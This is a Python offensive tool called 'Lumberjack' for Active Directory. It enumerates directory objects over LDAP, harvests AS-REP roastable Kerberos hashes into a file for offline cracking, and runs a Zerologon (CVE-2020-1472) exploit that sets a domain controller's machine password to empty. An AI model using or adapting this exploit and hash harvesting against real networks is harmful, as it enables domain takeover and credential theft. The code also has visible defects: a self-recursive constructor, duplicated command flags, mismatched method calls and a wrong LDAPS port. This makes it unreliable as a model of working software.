#!/usr/bin/python3
# -*- coding: utf-8 -*-
try:
	#module imports
	import argparse
	import re
	import sys
	import textwrap
	import ldap3
	import datetime
	import json	
	import socket
	import hmac
	import hashlib
	import struct
	import time

	#other imports
	from datetime import datetime
	from pprint import pprint
	from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, SUBTREE, NTLM, BASE, ALL_ATTRIBUTES, Entry, Attribute, ServerPool
	from ldap3.core.exceptions import LDAPBindError, LDAPException
	from getpass import getpass
	from time import sleep
	from rich.console import Console
	from termcolor import colored, cprint
	from rich.console import Theme
	from pyfiglet import Figlet
	from impacket.dcerpc.v5 import nrpc, epm
	from impacket.dcerpc.v5.dtypes import NULL
	from impacket.dcerpc.v5 import transport
	from impacket import crypto
	from impacket.krb5 import constants
	from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, AS_REP, seq_set, seq_set_iter
	from impacket.krb5.kerberosv5 import sendReceive, KerberosError
	from impacket.krb5.types import KerberosTime, Principal
	from pyasn1.codec.der import decoder, encoder
	from pyasn1.type.univ import noValue
	from binascii import hexlify
	import datetime, random
	from binascii import hexlify, unhexlify
	from subprocess import check_call
except Exception as e:
    	print ("Error {}".format(e))

"""
lumberjack.py
"""

custom_theme = Theme({"success": "cyan", "error": "red", "warning": "yellow", "status": "green", "info": "purple"})
console = Console(theme=custom_theme)
LDAP_BASE_DN = 'DC=hacklabtest,DC=local'

# Give up brute-forcing after 2000 attempts.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

#Enumeration Class
class EnumerateAD(object):

	def __init__(self, domainController, ldaps, ldap, no_credentials, verbose, ip_address, connect, enumObj, fuzz, status, username, password):
		
		if domainController:
			self.dc = domainController
		else: 
			self.getDCName()
		
		if ip_address:
			self.dIP = ip_address
		else:
			self.getDC_IP(domainController)

		self.dUser = username
		self.dPassword = password
		self.ldaps = ldaps
		self.ldap = ldap
		self.noCreds = no_credentials
		self.status = status
		self.verbose = verbose
		self.fuzz = fuzz
		
	#check if the credentials have been entered
	def checks(self):
		if self.dUser is not False:
			self.connectCreds()
		else:
			self.dUser = ''
			self.dPassword = ''
			self.connectNoCreds()	
	
	#Connect to domain
	def connectCreds(self):
		self.status.update(status="[bold white]Connecting to Active Directory...")
		try:
			#Connect through LDAPS (Secure)
			if self.ldaps:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, port=646, use_ssl=True, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, user=self.dUser, password=self.dPassword, fast_decoder=True, auto_bind=True,
							auto_referrals=True, check_names=False, read_only=True, lazy=False, raise_exceptions=False)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAPs", style = "success")
			#Connect through LDAP
			elif self.ldap:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, self.dUser, password=self.dPassword, auto_bind=True, auto_referrals = False, fast_decoder=True)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAP", style = "success")			
			else :
				sleep(1)
				console.print ("[-] Error: Failed to connect: ", style = "error")
				raise LDAPBindError	
		except Exception as e:
			console.print ("[-] Error: Failed to connect: {} ".format(e), style = "error")
			raise LDAPBindError
	
	def connectNoCreds(self):
		self.status.update(status="[bold white]Connecting to Active Directory...")
		try:
			#Connect through LDAPS without Credentials
			if self.noCreds & self.ldaps:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, port=646, use_ssl=True, get_info=ALL)
				self.server_pool.add(self.server)
				self.conn = Connection(self.server_pool, user=self.dUser, password=self.dPassword, fast_decoder=True, auto_bind=True,
							auto_referrals=True, check_names=False, read_only=True, lazy=False, raise_exceptions=False)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAPS and without credentials", style = "success")
			#Connect through LDAP without Credentials
			elif self.noCreds & self.ldap:
				self.server_pool = ServerPool(self.dIP)
				self.server = Server(self.dc, get_info=ALL)
				self.conn = Connection(self.server_pool, auto_bind=True, auto_referrals = False, fast_decoder=True)
				self.conn.open()
				self.conn.bind()
				console.print("[+] Success: Connected to Active Directory through LDAP and without credentials", style = "success")            
			else :
				sleep(1)
				console.print ("[-] Error: Failed to connect: ", style = "error")
				raise LDAPBindError	
		except Exception as e:
			console.print ("[-] Error: Failed to connect: {} ".format(e), style = "error")
			raise LDAPBindError
		
	# Get the IP address of the domain controller		
	def getDC_IP(self, domainController):		

		try:
			ip_address = socket.gethostbyname(domainController)
			console.print("[+] Success: IP address of the domain is {}".format(ip_address))
		except:
			console.print("[-] Error: Unable to locate IP Address of Domain Controller through host lookup. Please try again", style = "error")            			
			sys.exit(1)

		self.dIP = ip_address
	
	# Get the IP address of the domain name		
	def getDCName(self):		
		try:
			domainController = socket.gethostname()
			console.print("[+] Success: Domain Name is {}".format(domainController))
		except:
			console.print("[-] Error: Unable to locate Domain Name through host lookup. Please try again", style = "error")            			
			sys.exit(1)

		self.dc = domainController
		
	#Enumerate Active Directory Users		
	def enumerateUsers(self):
		try:			
			self.status.update("[bold white]Finding Active Directory Users...")
			sleep(1)
			#Search AD Users (Verbose)
			if self.verbose:
				self.conn.search(search_base=LDAP_BASE_DN, search_filter='(objectCategory=person)', search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
				console.print ("[+] Success: Got all domain users ", style = "success")
				console.print('[-] Found {0} user accounts'.format(len(self.conn.entries)), style = "info")
				pprint(self.conn.entries)
			else:
				uAttributes = ['uid', 'sn', 'givenName', 'mail', 'uidNumber', 'sn', 'cn']
				self.conn.search(search_base=LDAP_BASE_DN, search_filter='(objectCategory=person)', search_scope=SUBTREE, attributes = uAttributes, size_limit=0)
				console.print ("[+] Success: Got all domain users ", style = "success")
				console.print('[-] Found {0} user accounts'.format(len(self.conn.entries)), style = "info")
				pprint(self.conn.entries)
		except LDAPException as e:
			console.print ("[-] Warning: No Users found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Computers?", style = "status")
			input("")
			EnumerateAD.enumComputers(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Active Directory Computers		
	def enumComputers(self):
		try:			
			self.status.update("[bold white]Finding Active Directory Computers...")
			sleep(1)
			#Search AD Computers
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(&(objectCategory=computer)(objectClass=computer))',
					 search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print ("[+] Success: Got all domain computers ", style = "success")
			console.print('[-] Found {0} computers'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries)
		except LDAPException as e:
			console.print ("[-] Warning: No Computers found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Groups?", style = "status")
			input("")
			EnumerateAD.enumerateGroups(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)
		
	#Enumerate Active Directory Groups			
	def enumerateGroups(self):
		self.status.update("[bold white]Finding Active Directory Groups...")
		sleep(1)
		try:
			attrs = ['distinguishedName', 'cn', 'member']
			#Search AD Group
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(objectCategory=group)',
					 search_scope=SUBTREE, attributes = attrs, size_limit=0)
			console.print ("[+] Success: Got all groups ", style = "success")
			console.print('[-] Found {0} groups'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries)
		except LDAPException as e:
			console.print ("[-] Warning: No Groups found", style = "warning")
			pprint ("Error {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find Organisational Units?", style = "status")
			input("")
			EnumerateAD.enumerateOUs(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate Organisational Units
	def enumerateOUs(self):
		self.status.update("[bold white]Finding Organisational Units...")
		sleep(1)
		try:
			#Search AD Organisational Units
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(objectclass=organizationalUnit)',
					 search_scope=SUBTREE, attributes = 'member', size_limit=0)
			console.print ("[+] Success: Got all OUs ", style = "success")
			console.print('[-] Found {0} OUs'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries)
		except LDAPException as e:
			console.print ("[-] Warning: No OUs found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
		try:
			self.status.update("[bold white]Waiting...")
			console.print ("[-] Find ASREP Roastable Users?", style = "status")
			input("")
			EnumerateAD.enumKerbPreAuth(self)
		except KeyboardInterrupt:
			self.conn.unbind()
			console.print ("[-] Warning: Aborted", style = "warning")
			sys.exit(1)

	#Enumerate ASREP Roastable Users					
	def enumKerbPreAuth(self):
		self.status.update("[bold white]Finding Users that do not require Kerberos Pre-Authentication...")
		sleep(1)
		try:	
			self.users = []
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
					search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			for self.entry in self.conn.entries:
				self.users.append(str(self.entry['sAMAccountName']) + '@{0}'.format(self.dc))
			console.print('[-] Found {0} accounts that does not require Kerberos preauthentication'.format(len(self.conn.entries)), style = "info")
			if len(self.users) == 0:
				console.print('[-] Found {0} accounts that does not require Kerberos preauthentication'.format(len(self.users)), style = "info")
			elif len(self.users) >= 1:
				console.print('[-] Found {0} accounts that does not require Kerberos preauthentication'.format(len(self.users)), style = "info")
		except LDAPException as e:   
			console.print ("[-] Warning: No ASREP Roastable users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  	

		self.hashes = []
        # Build request for Tickets
		for usr in self.users:
			clientName = Principal(usr, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
			asReq = AS_REQ()
			domain = str(self.dc).upper()
			serverName = Principal('krbtgt/{0}'.format(domain), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
			pacReq = KERB_PA_PAC_REQUEST()
			pacReq['include-pac'] = True
			encodedPacReq = encoder.encode(pacReq)
			asReq['pvno'] = 5
			asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
			asReq['padata'] = noValue
			asReq['padata'][0] = noValue
			asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
			asReq['padata'][0]['padata-value'] = encodedPacReq

			requestBody = seq_set(asReq, 'req-body')

			options = list()
			options.append(constants.KDCOptions.forwardable.value)
			options.append(constants.KDCOptions.renewable.value)
			options.append(constants.KDCOptions.proxiable.value)
			requestBody['kdc-options'] = constants.encodeFlags(options)

			seq_set(requestBody, 'sname', serverName.components_to_asn1)
			seq_set(requestBody, 'cname', clientName.components_to_asn1)

			requestBody['realm'] = domain

			now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
			requestBody['till'] = KerberosTime.to_asn1(now)
			requestBody['rtime'] = KerberosTime.to_asn1(now)
			requestBody['nonce'] = random.getrandbits(31)

			supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

			seq_set_iter(requestBody, 'etype', supportedCiphers)

			msg = encoder.encode(asReq)

			try:
				response = sendReceive(msg, domain, self.dc)
			except KerberosError as e:
				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
					seq_set_iter(requestBody, 'etype', supportedCiphers)
					msg = encoder.encode(asReq)
					response = sendReceive(msg, domain, self.dc)
				else:
					print(e)
					continue

			asRep = decoder.decode(response, asn1Spec=AS_REP())[0]

			self.hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))

		if len(self.hashes) > 0:
			with open('{0}-jtr-hashes'.format(self.dc), 'w') as f:
				for h in self.hashes:
					f.write(str(h) + '\n')

			print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.dc))
		else:
			print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')

	#Enumerate accounts trusted for delegation (unconstrained delegation)					
	def unconstrainedDelegation(self):
		self.status.update("[bold white]Finding Users with unconstrained delegation...")
		sleep(1)
		try:	
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', 
					search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print('[-] Found {0} accounts with unconstrained delegation'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries)  
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  	  	
	
	#Enumerate SPNs
	def enumSPNs(self):
		try:	
			self.filter = "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
			self.conn.search(search_base=LDAP_BASE_DN, search_filter=self.filter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print('[-] Found {0} accounts with unconstrained delegation'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries)  
		except LDAPException as e:   
			console.print ("[-] Warning: No affected users found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  

	#date of last password change
	def passwdLastSet(self):
		self.status.update("[bold white]Finding dates of last password change...")
		sleep(1)
		try:	
			self.conn.search(search_base=LDAP_BASE_DN, search_filter='(&(objectCategory=person)(objectClass=user)(pwdLastSet>=*))', 
					search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print('[-] Found {0} SPNs'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries)  
		except LDAPException as e:   
			console.print ("[-] Warning: Error retrieving SPNs", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)
			
	#Fuzz AD with ANR (Ambiguous Name Resolution)
	def searchRandom(self, fobject, objectCategory=''):
		self.status.update("[bold white]Fuzzing Active Directory for:...")
		sleep(1)
		if objectCategory:
			searchFilter = '(&(objectCategory={})(anr={}))'.format(objectCategory, fobject)
		else:
			searchFilter = '(anr={})'.format(fobject)
		try:	
			self.conn.search(search_base=LDAP_BASE_DN, search_filter=searchFilter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
			console.print('[-] Found {0} objects'.format(len(self.conn.entries)), style = "info")
			pprint(self.conn.entries) 
		except LDAPException as e:   
			console.print ("[-] Warning Nothing found", style = "warning")
			pprint ("[-] Error: {}".format(e))
			sys.exit(1)  

#Script to exploit CVE-2020-1472 vulnerability in Active Directory
#Original script and research by Secura (Tom Tervoort) - https://www.secura.com/blog/zero-logon			
class zerologonExploit(object):
	
	def __init__(self, netbios, ip_address, status):

		self.zeroL = zerologonExploit(object)
		self.status = status
		self.dc_name = netbios.rstrip("$")
		self.dc_ip = ip_address
		self.zeroL.perform_attack("\\\\" + self.dc_name, self.dc_ip, self.dc_name)

	def fail(self, msg):
		print(msg, file=sys.stderr)
		print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
		sys.exit(2)
	 
	def try_zero_authenticate(self, dc_handle, dc_ip, target_computer):
		# Connect to the DC's Netlogon service.
		self.binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
		self.rpc_con = transport.DCERPCTransportFactory(self.binding).get_dce_rpc()
		self.rpc_con.connect()
		self.rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

		# Use an all-zero challenge and credential.
		self.plaintext = b'\x00' * 8
		self.ciphertext = b'\x00' * 8

		# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
		self.flags = 0x212fffff

		# Send challenge and authentication request.
		nrpc.hNetrServerReqChallenge(self.rpc_con, self.dc_handle + '\x00', self.target_computer + '\x00', self.plaintext)
		try:
			server_auth = nrpc.hNetrServerAuthenticate3(
					self.rpc_con, dc_handle + '\x00', self.target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
					self.target_computer + '\x00', self.ciphertext, self.flags
			)
			# It worked!
			assert server_auth['ErrorCode'] == 0
			return self.rpc_con

		except nrpc.DCERPCSessionError as ex:
			# Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
			if ex.get_error_code() == 0xc0000022:
				return None
			else:
				self.zeroL.fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
		except BaseException as ex:
			self.zeroL.fail(f'Unexpected error: {ex}.')
	 
	def try_zerologon(self, dc_handle, rpc_con, target_computer):
		self.request = nrpc.NetrServerPasswordSet2()
		self.request["PrimaryName"] = dc_handle + "\x00"
		self.request["AccountName"] = target_computer + "$\x00"
		self.request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
		self.authenticator = nrpc.NETLOGON_AUTHENTICATOR()
		self.authenticator["Credential"] = b"\x00" * 8
		self.authenticator["Timestamp"] = 0
		self.request["Authenticator"] = self.authenticator
		self.request["ComputerName"] = target_computer + "\x00"
		self.request["ClearNewPassword"] = b"\x00" * 516
		return self.rpc_con.request(self.request)	 
	 
	def perform_attack(self, dc_handle, dc_ip, target_computer):
		# Keep authenticating until successful. Expected average number of attempts needed: 256.
		self.status.update("[bold white]Performing authentication attempts...")
		self.rpc_con = None
		for attempt in range(0, MAX_ATTEMPTS):
			self.rpc_con = self.zeroL.try_zero_authenticate(self, dc_handle, dc_ip, target_computer)
			if self.rpc_con is None:
				cprint(".", "magenta", end="", flush=True)

		if self.rpc_con:
			console.print ("\n[+] Success: Target is vulnerable to CVE-2020-1472 ", style = "success")
			console.print ("[-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y", style = "status")
			self.exec_exploit = input().lower()
			if self.exec_exploit == "y":
				result = self.zeroL.try_zerologon(self, dc_handle, self.rpc_con, target_computer)
				if result["ErrorCode"] == 0:
					console.print ("[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string. ", 
									style = "success")
				else:
					self.zeroL.fail("[-] Exploit Failed: Non-zero return code, something went wrong. Domain Controller returned: {}".format(result["ErrorCode"]), style = "warning")
			else:
				self.zeroL.fail("[-] Warning: Aborted", style = "warning")
				sys.exit(0)
		else:
			self.zeroL.fail("[-] Exploit failed: target DC is probably patched.", style = "warning")
			sys.exit(1)
	 
def titleArt():
	f = Figlet(font="slant")
	cprint(colored(f.renderText('Lumberjack'), 'cyan'))

def main():

	parser = argparse.ArgumentParser(prog='Lumberjack', add_help=False, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
			    __                    __              _            __
			   / /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
			  / /   / / / / __ `__ \/ __ \/ _ \/ ___/ / __ `/ ___/ //_/
			 / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
			/_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
			                                   /___/
	                  __.                                   By Tom Gardner
	         ________/o |)
	        {_______{_rs|
	        
       A Prototype Active Directory Vulnerability Identification, Exploitation, & Reporting Tool
    |*------------------------------------------------------------------------------------------*|
   	 '''))

	#Required arguments
	parser.add_argument('-dc', type=str, help='Hostname of the Domain Controller')
	parser.add_argument('-ls', '--ldaps', help='Connect to domain through LDAPS (Secure)', action='store_true')
	parser.add_argument('-l', '--ldap', help='Connect to domain through LDAP', action='store_true')
	parser.add_argument('-u', '--username', type=str, help='Username of domain user. The username format must be `user@domain.org`')
	parser.add_argument('-p', '--password', type=str, help='Username Password`')
	parser.add_argument('-n', '--no_credentials', help='Run without credentials', action='store_true')
	parser.add_argument('-h', '--help', help='show this help message and exit', action='help')
	parser.add_argument('-ip', '--ip_address', type=str, help='ip address of Active Directory')
	parser.add_argument('-e', '--enumObj', help='Enumerate Active Directory Objects', action='store_true')
	parser.add_argument('-c', '--connect', help='Just connect and nothing else', action='store_true')
	parser.add_argument("-n", '--netbios', help='NetBIOS name of Domain Controller')
	parser.add_argument('-v', '--verbose', action='store_true')
	parser.add_argument('-e', '--exploit', help='run exploit features', action='store_true')
	parser.add_argument('-f', '--fuzz', type=str)
	args = parser.parse_args()
	
	#Display help page if no arguments are provided
	if len(sys.argv) < 2:
		console.print("[-] Warning: No Arguments Provided", style = "warning")
		parser.print_help()
		parser.exit(1)
	
	if args.no_credentials:
		args.username = False
		
	if args.connect:
		args.enumObj = False
		args.fuzz = False	
	elif args.enumObj:
		args.fuzz = False
	elif args.fuzz:
		args.enumObj = False
		
	# Regex for invalid domain name or invalid ip address format
	domainRE = re.compile(r'^((?:[a-zA-Z0-9-.]+)?(?:[a-zA-Z0-9-.]+)?[a-zA-Z0-9-]+\.[a-zA-Z]+)$')
	domainMatch = domainRE.findall(args.dc)

	ipRE = re.compile(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")
	ipaddr = ipRE.findall(args.ip_address)
	
	#if invalid domain name and ip address format
	if not domainMatch:
		console.print("[-] Error: {} is not a valid domain name'".format(args.dc), style = "error")
		sys.exit(1)
	if not ipaddr:
		console.print("[-] Error: {} is not a valid IP Address'".format(args.ip_address), style = "error")
		sys.exit(1)
		
	titleArt()
	console.print("[+] Success: Lumberjack Started", style="success")	
	start_time = datetime.now()
	
	#Run main features
	try:
		enumAD = EnumerateAD(args.dc, args.ldaps, args.ldap, args.no_credentials, args.verbose, args.ip_address, args.connect, args.enumObj, args.fuzz, status, args.username, args.password)
		zeroLogon = zerologonExploit(args.netbios, args.ip_address, status)
		enumAD.checks()
		if args.enumObj is not False:
			enumAD.enumerateUsers()
		elif args.fuzz is not False:
			enumAD.searchRandom(args.fuzz)
		elif args.exploit and args.enumObj is False:
			zeroLogon.__init__()
		else:
			sys.exit(1)

	except RuntimeError as e:
		pprint ("Error {}".format(e))
	except KeyboardInterrupt:
		console.print ("[-] Warning: Aborting", style = "warning")
		
	status.update("[bold white]Exiting Lumberjack...")
	sleep(2)
	elapsed = datetime.now() - start_time
	console.print(f"[+] Completed after {elapsed.total_seconds():.2f} seconds", style="warning")
	
	#print blank line
	pprint('')
	
if __name__ == "__main__":
	with console.status("[bold white]Starting Lumberjack...") as status:
		try:
			sleep(2)
			main()
			console.print("[+] Success: Finished", style="success")	
		except KeyboardInterrupt:
			console.print ("[-] Warning: Aborted", style= "warning")
